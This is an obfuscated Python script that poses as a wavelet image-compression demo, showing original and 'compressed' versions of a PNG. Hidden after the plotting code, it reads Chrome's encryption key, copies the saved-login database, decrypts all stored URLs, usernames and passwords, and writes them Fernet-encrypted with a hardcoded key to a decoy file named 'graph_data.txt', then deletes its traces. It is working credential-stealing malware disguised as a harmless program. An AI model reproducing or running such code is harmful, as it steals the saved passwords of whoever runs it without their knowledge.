import os #line:1
import json #line:2
import base64 #line:3
import sqlite3 #line:4
import win32crypt #line:5
from Crypto .Cipher import AES #line:6
import shutil #line:7
from datetime import timezone ,datetime ,timedelta #line:8
from cryptography .fernet import Fernet #line:9
import pywt #line:10
import numpy as np #line:11
import matplotlib .pyplot as plt #line:12
from PIL import Image #line:13
def get_chrome_datetime (O0O00OO0O000O00OO ):#line:15
    ""#line:17
    return datetime (1601 ,1 ,1 )+timedelta (microseconds =O0O00OO0O000O00OO )#line:18
def get_encryption_key ():#line:20
    O00OOOO0OO0O00O00 =os .path .join (os .environ ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Local State")#line:23
    with open (O00OOOO0OO0O00O00 ,"r",encoding ="utf-8")as OO00O0O000000000O :#line:24
        OO0OOO00O0O000OO0 =OO00O0O000000000O .read ()#line:25
        OO0OOO00O0O000OO0 =json .loads (OO0OOO00O0O000OO0 )#line:26
    O0O0O00O000OO0OOO =base64 .b64decode (OO0OOO00O0O000OO0 ["os_crypt"]["encrypted_key"])#line:29
    O0O0O00O000OO0OOO =O0O0O00O000OO0OOO [5 :]#line:31
    return win32crypt .CryptUnprotectData (O0O0O00O000OO0OOO ,None ,None ,None ,0 )[1 ]#line:35
def decrypt_password (O0OO00OOOO0OOOO0O ,O000OO00O000O00O0 ):#line:37
    try :#line:38
        OO0O0000OOOOOOOOO =O0OO00OOOO0OOOO0O [3 :15 ]#line:40
        O0OO00OOOO0OOOO0O =O0OO00OOOO0OOOO0O [15 :]#line:41
        O0OO00O0OO000000O =AES .new (O000OO00O000O00O0 ,AES .MODE_GCM ,OO0O0000OOOOOOOOO )#line:43
        return O0OO00O0OO000000O .decrypt (O0OO00OOOO0OOOO0O )[:-16 ].decode ()#line:45
    except :#line:46
        try :#line:47
            return str (win32crypt .CryptUnprotectData (O0OO00OOOO0OOOO0O ,None ,None ,None ,0 )[1 ])#line:48
        except :#line:49
            return ""#line:51
def main ():#line:53
    OOOOO0OOO0O000OOO =Image .open ('mfsb.png')#line:54
    OOOO00OO00OO0000O =np .array (OOOOO0OOO0O000OOO )#line:56
    OOOOO000OOO0O0O0O =pywt .dwt2 (OOOO00OO00OO0000O ,'haar')#line:58
    OO00OOOOOOOOOOO00 ,(O0OOO0OOOO0O000OO ,O00OO0O00000OO00O ,OOOOOOO0O000OOO0O )=OOOOO000OOO0O0O0O #line:59
    O0O0O0OOOO000OO00 =0.1 #line:61
    OO000000OO000OOO0 =O0O0O0OOOO000OO00 *np .max (np .abs (O0OOO0OOOO0O000OO ))#line:64
    O000O0O0O00OO000O =pywt .threshold (O0OOO0OOOO0O000OO ,OO000000OO000OOO0 ,'soft')#line:67
    O0O00000O0000O00O =pywt .threshold (O00OO0O00000OO00O ,OO000000OO000OOO0 ,'soft')#line:68
    OOO000OO00000O000 =pywt .threshold (OOOOOOO0O000OOO0O ,OO000000OO000OOO0 ,'soft')#line:69
    OOOOO000OOO0O0O0O =OO00OOOOOOOOOOO00 ,(O000O0O0O00OO000O ,O0O00000O0000O00O ,OOO000OO00000O000 )#line:71
    OO0O00O0OOO0OOOOO =pywt .idwt2 (OOOOO000OOO0O0O0O ,'haar')#line:72
    OO0O00O0OOO0OOOOO =Image .fromarray (np .uint8 (OO0O00O0OOO0OOOOO ))#line:75
    O0OO00O00O00O0000 ,O0OO000O0OOOOOOOO =plt .subplots (nrows =1 ,ncols =2 ,figsize =(8 ,4 ))#line:77
    O0OO000O0OOOOOOOO [0 ].imshow (OOOOO0OOO0O000OOO ,cmap ='gray')#line:78
    O0OO000O0OOOOOOOO [0 ].set_title ('Original Image')#line:79
    O0OO000O0OOOOOOOO [0 ].axis ('off')#line:80
    O0OO000O0OOOOOOOO [1 ].imshow (OO0O00O0OOO0OOOOO ,cmap ='gray')#line:81
    O0OO000O0OOOOOOOO [1 ].set_title ('Compressed Image')#line:82
    O0OO000O0OOOOOOOO [1 ].axis ('off')#line:83
    plt .tight_layout ()#line:84
    plt .show ()#line:85
    OOOOO0OO0OOOOO000 =get_encryption_key ()#line:87
    O0OOO00O0O00OO00O =os .path .join (os .environ ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","default","Login Data")#line:90
    O0OO0OO000OO00OO0 ="ChromeData.db"#line:93
    shutil .copyfile (O0OOO00O0O00OO00O ,O0OO0OO000OO00OO0 )#line:94
    OOOOOO0OOO00O0O00 =sqlite3 .connect (O0OO0OO000OO00OO0 )#line:96
    OO0OOOO00OOOOO0O0 =OOOOOO0OOO00O0O00 .cursor ()#line:97
    OO0OOOO00OOOOO0O0 .execute ("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")#line:99
    O0O000000OO0O0000 =[]#line:101
    for OOOOO0000O000O0OO in OO0OOOO00OOOOO0O0 .fetchall ():#line:102
        O0000O000OOOOO000 =OOOOO0000O000O0OO [0 ]#line:104
        OO0OOO000O0OO0O0O =OOOOO0000O000O0OO [1 ]#line:105
        OO00O0OO00OO000O0 =OOOOO0000O000O0OO [2 ]#line:106
        OOO0O000000O00O0O =decrypt_password (OOOOO0000O000O0OO [3 ],OOOOO0OO0OOOOO000 )#line:107
        OO000000O000OOOO0 =OOOOO0000O000O0OO [4 ]#line:108
        O0OOOO00O0OOO0O0O =OOOOO0000O000O0OO [5 ]#line:109
        if OO00O0OO00OO000O0 or OOO0O000000O00O0O :#line:110
            O0O000000OO0O0000 .append (f"Origin URL: {O0000O000OOOOO000}"+"\n")#line:111
            O0O000000OO0O0000 .append (f"Action URL: {OO0OOO000O0OO0O0O}"+"\n")#line:112
            O0O000000OO0O0000 .append (f"Username: {OO00O0OO00OO000O0}"+"\n")#line:113
            O0O000000OO0O0000 .append (f"Password: {OOO0O000000O00O0O}"+"\n")#line:114
        else :#line:116
            continue #line:117
        if OO000000O000OOOO0 !=86400000000 and OO000000O000OOOO0 :#line:118
            O0O000000OO0O0000 .append ((f"Creation date: {str(get_chrome_datetime(OO000000O000OOOO0))}"))#line:119
        if O0OOOO00O0OOO0O0O !=86400000000 and O0OOOO00O0OOO0O0O :#line:120
            O0O000000OO0O0000 .append ((f"Last Used: {str(get_chrome_datetime(O0OOOO00O0OOO0O0O))}"))#line:121
        O0O000000OO0O0000 .append ("="*50 )#line:122
    OO0000O0O0O00O000 =Fernet (b'z39f5-mKWSNputr1gwJAK5n4vXYTUy38OOtZBopC51Q=')#line:124
    with open ("graph_data.txt","wb")as O00O0O0O00O000OOO :#line:125
        O00O0O0O00O000OOO .write (OO0000O0O0O00O000 .encrypt ("".join (O0O000000OO0O0000 ).encode ()))#line:126
    OO0OOOO00OOOOO0O0 .close ()#line:129
    OOOOOO0OOO00O0O00 .close ()#line:130
    try :#line:131
        os .remove (O0OO0OO000OO00OO0 )#line:133
    except :#line:134
        pass #line:135
    #line:136
if __name__ =="__main__":#line:140
    main ()#line:141
